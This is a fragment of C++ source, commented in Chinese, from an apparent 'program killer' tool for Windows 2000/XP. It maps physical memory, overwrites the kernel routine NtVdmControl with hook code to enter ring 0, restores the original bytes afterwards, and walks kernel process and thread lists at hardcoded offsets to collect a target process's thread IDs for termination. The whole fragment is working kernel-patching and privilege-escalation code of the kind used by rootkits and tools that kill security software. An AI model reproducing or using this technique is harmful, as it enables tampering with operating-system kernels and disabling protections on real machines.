	pfnNtVdmControl = (NTSTATUS (__stdcall *)(ULONG,PVOID))((ULONG)pfnNtVdmControl + offset);
	pobNtBuildNumber = (ULONG*)((ULONG)pobNtBuildNumber + offset);
	pfnObReferenceObjectByPointer =(NTSTATUS (__stdcall *)(PVOID,ACCESS_MASK,POBJECT_TYPE,KPROCESSOR_MODE))((ULONG)pfnObReferenceObjectByPointer + offset);
	pfnObReferenceObjectByHandle = (NTSTATUS (__stdcall *)(HANDLE,ACCESS_MASK,POBJECT_TYPE,KPROCESSOR_MODE,PVOID *,POBJECT_HANDLE_INFORMATION))((ULONG)pfnObReferenceObjectByHandle + offset);
	pfnObOpenObjectByPointer = (NTSTATUS (__stdcall *)(PVOID,ULONG,PACCESS_STATE,ACCESS_MASK,POBJECT_TYPE,KPROCESSOR_MODE,PHANDLE))((ULONG)pfnObOpenObjectByPointer + offset);
	pfnObfDereferenceObject = (void (__fastcall *)(PVOID))((ULONG)pfnObfDereferenceObject + offset);
	pfnExAllocatePoolWithTag = (PVOID (__stdcall *)(LONG,SIZE_T,ULONG))((ULONG)pfnExAllocatePoolWithTag + offset);
	pfnExFreePool = (void (__stdcall *)(PVOID))((ULONG)pfnExFreePool + offset);
	pfnKeGetCurrentThread = (PKTHREAD (__stdcall *)(void))((ULONG)pfnKeGetCurrentThread + offset);
	pfnKeInitializeApc = (void (__stdcall *)(PRKAPC,PRKTHREAD,KAPC_ENVIRONMENT,PKKERNEL_ROUTINE,PKRUNDOWN_ROUTINE,PKNORMAL_ROUTINE,KPROCESSOR_MODE,PVOID))((ULONG)pfnKeInitializeApc + offset);
	pfnKeInsertQueueApc = (BOOLEAN (__stdcall *)(PRKAPC,PVOID,PVOID,LONG))((ULONG)pfnKeInsertQueueApc + offset);
	pobKeServiceDescriptorTable = (PServiceDescriptorTableEntry *)((ULONG)pobKeServiceDescriptorTable + offset);
	pfnPsGetVersion = (BOOLEAN (__stdcall *)(PULONG,PULONG,PULONG,PUNICODE_STRING))((ULONG)pfnPsGetVersion + offset);
	pfnPsGetCurrentProcessId = (HANDLE (__stdcall *)(void))((ULONG)pfnPsGetCurrentProcessId + offset);
	pfnPsTerminateSystemThread = (NTSTATUS (__stdcall *)(NTSTATUS))((ULONG)pfnPsTerminateSystemThread + offset);
	pfnPsLookupThreadByThreadId = (NTSTATUS (__stdcall *)(PVOID,PETHREAD *))((ULONG)pfnPsLookupThreadByThreadId + offset);
	pfnZwClose = (NTSTATUS (__stdcall *)(HANDLE))((ULONG)pfnZwClose + offset);
	pfnZwCreateFile = (NTSTATUS (__stdcall *)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PIO_STATUS_BLOCK,PLARGE_INTEGER,ULONG,ULONG,ULONG,ULONG,PVOID,ULONG))((ULONG)pfnZwCreateFile + offset);
	pobIoFileObjectType = (POBJECT_TYPE *)((ULONG)pobIoFileObjectType + offset);
	pobPsThreadType = (POBJECT_TYPE *)((ULONG)pobPsThreadType + offset);

	//填写补丁代码
	*(ULONG *)(HookCode + 1) = (ULONG)pfnPsGetCurrentProcessId - (ULONG)pfnNtVdmControl - 5;
	*(ULONG *)(HookCode + 6) = GetCurrentProcessId();
	*(ULONG *)(HookCode + 13) = (ULONG)Ring0Entry - (ULONG)pfnNtVdmControl - 17;

	hMemory = OpenPhysicalMemory();

	if (hMemory == NULL)
		goto FreeAndExit;

	ReadMemory(hMemory, (PVOID)pobKeServiceDescriptorTable, (PVOID)&pAddrNtTerminateThread, sizeof(PVOID));
	pAddrNtTerminateThread = (UCHAR *)pAddrNtTerminateThread + (*(ULONG *)((UCHAR *)ZwTerminateThread + 1)) * sizeof(PVOID);
	ReadMemory(hMemory, (PVOID)pAddrNtTerminateThread, (PVOID)&pfnNtTerminateThread, sizeof(PVOID));
	VirtualQuery(hShellModule, &mem, sizeof(mem));

	//在内存中锁定当前模块，避免RING0中发生缺页异常
	//	if (VirtualLock(mem.BaseAddress, mem.RegionSize))
	{
		ReadMemory(hMemory, (PVOID)pfnNtVdmControl, OrigCode, sizeof(OrigCode));
		//写入补丁代码
		WriteMemory(hMemory, (PVOID)pfnNtVdmControl, HookCode, sizeof(HookCode));
		//进RING0
		status = NtVdmControl((ULONG)Ring0Routine, Ring0Argument);
		//还原修改过的代码
		WriteMemory(hMemory, (PVOID)pfnNtVdmControl, OrigCode, sizeof(OrigCode));
		//内存解锁，避免占用过多内存
		//		VirtualUnlock(mem.BaseAddress, mem.RegionSize);
	}

FreeAndExit:
	if (hMemory != NULL)
		ZwClose(hMemory);

	if (hKernel != NULL)
		FreeLibrary(hKernel);

	return status;
}

bool CProgramKiller::EnumAllThreads(IN ULONG UniqueProcessId, OUT PRING0_KILLTHREAD ThreadId)
{
	HANDLE hMemory;
	ULONG thread, process, ep, et, pid, tid, tmp = 0;
	OSVERSIONINFO osvi = {sizeof(OSVERSIONINFO)};

	ThreadId->ThreadCount = 0;

	if (!GetVersionEx(&osvi))
		return FALSE;

	//Windows 2003 sp1以后的版本该操作会失败
	hMemory = OpenPhysicalMemory();

	if (hMemory == NULL)
		return FALSE;

	ReadMemory(hMemory, (PVOID)0xFFDFF124, &thread, sizeof(ULONG)); //读取ETHREAD的地址
	ReadMemory(hMemory, (PVOID)(thread + 0x44), &process, sizeof(ULONG)); //从中ETHREAD取出EPROCESS的地址

	//查找指定进程的EPROCESS
	for (ep = process;;)
	{
		switch (osvi.dwBuildNumber)
		{
		case 2195:
			ReadMemory(hMemory, (PVOID)(ep + 0xa0), &ep, sizeof(ULONG));	//读取ActiveProcessLinks.Flink
			ep -= 0xa0;
			ReadMemory(hMemory, (PVOID)(ep + 0x9c), &pid, sizeof(ULONG));	//读取UniqueProcessId
			break;
		case 2600:
			ReadMemory(hMemory, (PVOID)(ep + 0x88), &ep, sizeof(ULONG));	//读取ActiveProcessLinks.Flink
			ep -= 0x88;
			ReadMemory(hMemory, (PVOID)(ep + 0x84), &pid, sizeof(ULONG));	//读取UniqueProcessId
			break;
		case 3790:								//无核心资料，放弃
		default:
			CloseHandle(hMemory);				//失败，未知系统版本
			return FALSE;
		}

		if (pid == UniqueProcessId)
			break;

		if (ep == process)
		{
			CloseHandle(hMemory);
			return FALSE;
		}
	}

	switch (osvi.dwBuildNumber)
	{
	case 2195:
		ReadMemory(hMemory, (PVOID)(ep + 0x50), &thread, sizeof(ULONG));	//读取ThreadListHead.Flink
		thread -= 0x1a4;
		break;
	case 2600:
		ReadMemory(hMemory, (PVOID)(ep + 0x190), &thread, sizeof(ULONG));	//读取ThreadListHead.Flink
		thread -= 0x22c;
		break;
	case 3790:
		break;
	}

	for (et = thread;;)
	{
		switch (osvi.dwBuildNumber)
		{
		case 2195:
			ReadMemory(hMemory, (PVOID)(et + 0xa0), &tid, sizeof(ULONG));	//读取UniqueThread
			ReadMemory(hMemory, (PVOID)(et + 0x1a4), &et, sizeof(ULONG));	//读取ThreadListEntry.Flink
			et -= 0x1a4;
			break;
		case 2600:
			ReadMemory(hMemory, (PVOID)(et + 0x1f0), &tid, sizeof(ULONG));	//读取UniqueThread
			ReadMemory(hMemory, (PVOID)(et + 0x22c), &et, sizeof(ULONG));	//读取ThreadListEntry.Flink
			et -= 0x22c;
			break;
		case 3790:
			break;
		}

		if (tid != 0)
			ThreadId->ThreadArray[ThreadId->ThreadCount++] = tid;

		if (et == thread)
			break;
	}

	CloseHandle(hMemory);

	return TRUE;
}